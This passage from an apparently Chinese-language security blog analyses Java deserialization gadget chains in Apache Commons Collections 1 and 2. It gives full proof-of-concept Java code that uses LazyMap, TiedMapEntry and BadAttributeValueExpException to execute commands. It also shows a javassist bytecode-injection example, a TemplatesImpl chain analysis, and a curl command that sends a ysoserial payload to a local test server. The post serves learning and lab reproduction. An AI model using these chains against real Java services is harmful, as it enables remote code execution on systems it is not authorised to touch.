<span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        lazyMap.get(<span class="string">&quot;hello&quot;</span>);<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215558587.png" alt="image-20210805215558587"></p>
<p>现在，我们尝试模拟远程服务器与客户端之间的序列化和反序列化流程。</p>
<p><strong>POC</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(lazyMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">target</span> <span class="operator">=</span> (Map) objectInputStream.readObject();</span><br><span class="line">        target.get(<span class="string">&quot;hello&quot;</span>);<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功！我们现在看看，服务端触发漏洞的话，需要什么条件： 将反序列化后的object强制转化为Map类，然后再调用get()方法 - 看上去依然有点麻烦，我们有什么办法能让它更容易被触发呢？</p>
<h4 id="第五步：TiedMapEntry-getValue"><a href="#第五步：TiedMapEntry-getValue" class="headerlink" title="第五步：TiedMapEntry.getValue()"></a>第五步：TiedMapEntry.getValue()</h4><p>安全研究前辈们并未发现有可控且调用<code>get()</code>方法的<code>readObject()</code>方法，但在<code>TiedMapEntry</code>类中，<code>getValue()</code>方法调用了get()方法，<code>map</code>变量是可控的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806093126421.png" alt="image-20210806093126421"></p>
<h4 id="第六步：TiedMapEntry-toString"><a href="#第六步：TiedMapEntry-toString" class="headerlink" title="第六步：TiedMapEntry.toString()"></a>第六步：TiedMapEntry.toString()</h4><p>我们继续找有没有调用<code>getValue()</code>的方法，就在<code>TiedMapEntry</code>类中，我们发现了<code>toString()</code>，其中会调用到<code>getValue()</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样一来我们的利用链便是 - <code>调用toString()会触发 -&gt; getValue() -&gt;get()</code>。那是否能像<code>TransformedMap</code>版本的POC一样，能够找到一个可控的<code>readObject()</code>直接调用<code>toString()</code>呢？</p>
<h4 id="第七步：BadAttributeValueExpException"><a href="#第七步：BadAttributeValueExpException" class="headerlink" title="第七步：BadAttributeValueExpException"></a>第七步：BadAttributeValueExpException</h4><p>在<code>BadAttributeValueExpException</code>类中，我们发现了<code>readObject()</code>方法，其调用了<code>toString()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);<span class="comment">//valObj是从fields中得到val的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();<span class="comment">//此处调用了toString()</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们能够控制<code>valObj</code>为<code>TiedMapEntry</code>类的<code>object</code>，就能够触发漏洞。这里的<code>valObj</code>是从反序列化后的<code>object</code>的<code>fields</code>中直接得到的，那么我们可以直接创建一个值为<code>TiedMapEntry</code>类<code>object</code>的<code>val</code>field。</p>
<p>我们先看看<code>constructor</code>能不能直接赋值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    <span class="comment">//如果val为null，则this.val=null</span></span><br><span class="line">    <span class="comment">//如果val不为null,则this.val = val.toString()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>constructor</code>中，如果我们直接通过构造方法传入<code>TiedMapEntry</code>类，会在客户端创建<code>object</code>的时候就执行<code>toString()</code>触发方法并把结果赋值给<code>val</code>，而服务器在调用<code>readObject()</code>的时候获取到的<code>val</code>为<strong>toString()方法的返回值</strong>，从而不会触发漏洞。</p>
<p>于是我们不能通过<code>constructor</code>传入<code>TiedMapEntry</code>类的<code>object</code>，相反，我们设置它为<code>null</code>。我们尝试能否手动设置val的值：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095753374.png" alt="image-20210806095753374"></p>
<p>发现并不能访问到<code>val</code>值，val值是<code>private</code>属性,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095846949.png" alt="image-20210806095846949"></p>
<p>在<code>BadAttributeValueExpException</code>类中也没有<code>setter</code>能够帮助我们去设置。那么我们可以使用反射对其赋值。</p>
<h4 id="最终POC-1"><a href="#最终POC-1" class="headerlink" title="最终POC"></a>最终POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//绑定给TiedMapEntry，如果TiedMapEntry的toString()被执行，lazyMap会被执行get()</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);<span class="comment">//该类中的readObject()可控，可执行TiedMapEntry的toString()</span></span><br><span class="line">        <span class="comment">//创建一个badAttributeValueExpException实例，这将作为我们的最终的恶意object被序列化</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);<span class="comment">//得到val这个variable</span></span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是private，所以需要设置accessible为true</span></span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);<span class="comment">//修改val的值为tiedMapEntry</span></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);<span class="comment">//序列化badAttributeValueExpException</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://wjlshare.com/archives/1498#Transformer">Java反序列化-CommonCollections</a></p>
<p><a href="https://www.guildhab.top/2020/06/java-rmi-%E5%88%A9%E7%94%A84-%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%B8%A4%E6%9D%A1-apache-commons-collections-pop-gadget-chains/">Java 反序列化漏洞(4) – Apache Commons Collections POP Gadget Chains 剖析</a></p>
<p><a href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">【反序列化漏洞】commons-collections-1 组件</a></p>
<p><a href="https://www.cnblogs.com/yyhuni/p/14777166.html">Java反序列化漏洞Apache CommonsCollections分析</a></p>
<h2 id="Commons-Collections-2"><a href="#Commons-Collections-2" class="headerlink" title="Commons Collections 2"></a>Commons Collections 2</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">CommonsCollections4-4.0</a></p>
<p>jdk1.7 1.8低版本</p>
<p><a href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之Ysoserial安装配置</a>中的<strong>WebServer环境搭建</strong>章节</p>
<h3 id="复现演示"><a href="#复现演示" class="headerlink" title="复现演示"></a>复现演示</h3><p>首先在Ysoserial中配置：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190531654.png" alt="image-20211126190531654"></p>
<p>运行生成：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190648753.png" alt="image-20211126190648753"></p>
<p>运行我们的webserver：</p>
<p><code>curl &quot;http://localhost:9090/webTest1_Web_exploded/test&quot; --data-binary @payload.ser</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126191106461.png" alt="image-20211126191106461"></p>
<p>即可弹出计算器。</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="CommonsCollections-2-利用链原理"><a href="#CommonsCollections-2-利用链原理" class="headerlink" title="CommonsCollections 2 利用链原理"></a>CommonsCollections 2 利用链原理</h4><p>在<strong>CommonsCollections2</strong>中，我们将使用<a href="https://leihehehe.github.io/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/">javassist</a>在java字节码(.class)中插入命令执行代码，接着用某个重写了<code>loadClass</code>方法的<strong>ClassLoader</strong>来加载我们生成好的字节码(.class文件)，实现执行恶意代码的效果。ClassLoader用双亲委派机制来加载Class。</p>
<h4 id="Javassist生成执行命令的Class"><a href="#Javassist生成执行命令的Class" class="headerlink" title="Javassist生成执行命令的Class"></a>Javassist生成执行命令的Class</h4><p>首先我们先模拟以下<strong>javassist</strong>怎么生成执行命令的字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">//需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//获取一个默认的ClassPool</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> cp.get(javassistTest.class.getName());<span class="comment">//根据反射知识，javassistTest.class是javassistTest instance(object),将javassistTest object的名字放入ClassPool的hashmap中，并返回一个ctClass</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>CtClass cc = cp.get(javassistTest.class.getName());</code></p>
<p>我们知道每个需要修改编辑的Class都需要有一个<strong>CtClass</strong>，所以我们需要为我们需要修改的class创建一个CtClass。此处，我们把javassistTest object放入了ClassPool的hashmap中（表明我们需要修改此类），它会给我们返回一个新的CtClass。</p>
<blockquote>
<p>The <strong>java.lang.Class.getName()</strong> returns the name of the entity (class, interface, array class, primitive type, or void) represented by this Class object, as a String.</p>
</blockquote>
<p>所以我们是在hashmap中放入javassistTest object的名字，然后返回了一个新的CtClass。</p>
<p>当我们得到了这个新的CtClass，我们就可以对字节码进行操作了。</p>
<blockquote>
<p>CtConstructor, <em>makeClassInitializer</em>(). Makes an empty class initializer (static constructor).</p>
</blockquote>
<p><code> cc.makeClassInitializer().insertBefore(cmd)</code>创建了一个static代码块，并把cmd插入到了static代码块前面，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>cc.setName(&quot;Leihehe&quot;);</code>设置了字节码中的类名</p>
<p><code>cc.writeFile();</code>是将字节码保存到文件中。<strong>这时候，我们的字节码编写工作就完成了！</strong></p>
<h4 id="ClassLoader加载字节码"><a href="#ClassLoader加载字节码" class="headerlink" title="ClassLoader加载字节码"></a>ClassLoader加载字节码</h4><p>我们平时写代码的文件都是.java格式，经过编译后，会生成.class文件，也就是字节码。 JVM虚拟机想要执行字节码的话，需要使用<strong>ClassLoader Class</strong>来将这些文件load进JVM，其中的<code>defineClass()</code>方法就是来做这件事的。</p>
<p>下面我们手写一个ClassLoader来加载字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;<span class="comment">//继承ClassLoader</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(String name,<span class="type">byte</span>[] b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(name,b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着， 我们在之前的<code>javassistTest </code> Class里添加以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(javassistTest.class.getClassLoader()).g(<span class="literal">null</span>,classBytes).newInstance();</span><br></pre></td></tr></table></figure>

<p><code>TestClassLoader(javassistTest.class.getClassLoader())</code>加载了字节码，<code>g()</code>将bytes[]类型的字节码转换成了一个Class instance，但Class instance中的内容并不会主动执行(static代码区)和初始化，所以我们需要使用newInstance()手动触发。</p>
<p><strong>效果：</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126223902264.png" alt="image-20211126223902264"></p>
<h4 id="TemplateImpl类及其利用链"><a href="#TemplateImpl类及其利用链" class="headerlink" title="TemplateImpl类及其利用链"></a>TemplateImpl类及其利用链</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>Javassist将Class加载成字节码，并对其执行方法进行修改（例如：插入恶意代码），接着我们将字节码传入A类的变量中。此处的A类能将该变量中的字节码实例化为对象，从而触发其中的static方法。</p>
<p>在CommonsCollections 2利用链中，<strong>TemplateImpl Class</strong>就是我们payload构造的起点。<strong>TemplateImpl Class</strong>中能将bytecodes变量用<strong>Classloader</strong> load并执行：</p>
<p>接下来，我们先来倒着分析一下：我们首先需要找到可以执行漏洞的地方。</p>
<h5 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127154940678.png" alt="image-20211127154940678"></p>
<p>通过观察上图<code>defineTransletClasses()</code>中的内容，我们可以发现此处创建了一个新的<strong>TransletClassLoader instance</strong>，并返回到变量<strong>loader</strong>。因为最后一行要访问<code>_tfactory.getEcternalEctensionMap()</code>，所以如果我们需要call这个方法的话，需要设置<code>_tfactory</code>的值，因其为<strong>TransformerFactoryImpl</strong>类型，所以我们new一个就可以了，</p>
<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>接着这下面又有一段代码</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127214801875.png" alt="image-20211127214801875"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上图中，<code>loader.defineClass(_bytecodes[i]);</code>将字节码**_bytecodes<strong>传入</strong>loader** - 加载字符码。需要注意的是，我们的字节码的super class必须是AbstractTranslet类。</p>
<p>那么我们要如何才能<strong>触发defineTransletClasses -&gt; loader.defineClass呢？</strong></p>
<h5 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="image-20211127161222841">接着我们可以通过<code>getTranslateInstance()</code>来call到<code>defineTransletClasses()</code> - 当<code>_class</code>为空时，<code>defineTransletClasses()</code>会被执行。而之后 <code>.newInstance()</code>创建了instance，执行命令。但要想要执行到<code>newInstance()</code>,我们需要满足<code>_name != null</code></p>
<p>那么哪里又可以call到**getTransletInstance()**呢？</p>
<h5 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212356132.png" alt="image-20211127212356132"></p>
<h5 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h5><p>同样在<strong>TransformerImpl</strong>类的<code>getOutputProperties()</code>方法中发现newTransformer()被call了<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212511457.png" alt="image-20211127212511457"></p>
<h5 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h5><p>因此我们可以总结出，完整的利用链：</p>
<blockquote>
<p>TemplatesImpl.getOutputProperties()<br>TemplatesImpl.newTransformer()<br> TemplatesImpl.getTransletInstance()<br>     TemplatesImpl.defineTransletClasses()<br>         TransletClassLoader.defineClass()</p>
</blockquote>
<p><code>newTransformer()</code>也可作为利用链的开端</p>
<p>经过分析，我们只需要给<strong>TransletImpl</strong>类给以下的attributes赋值：</p>
<ul>
<li><strong>_bytecodes(恶意字节码)</strong></li>
<li><strong>_class(null)</strong></li>
<li><strong>_name(任意非空字符串)</strong></li>
<li><strong>_tfactory(new TransformerFactoryImpl())</strong></li>
</ul>
<p>同时，我们的字节码Class需要继承<strong>AbstractTranslet</strong>类</p>
<p>最后call <code>TemplatesImpl.getOutputProperties()</code>即可。</p>
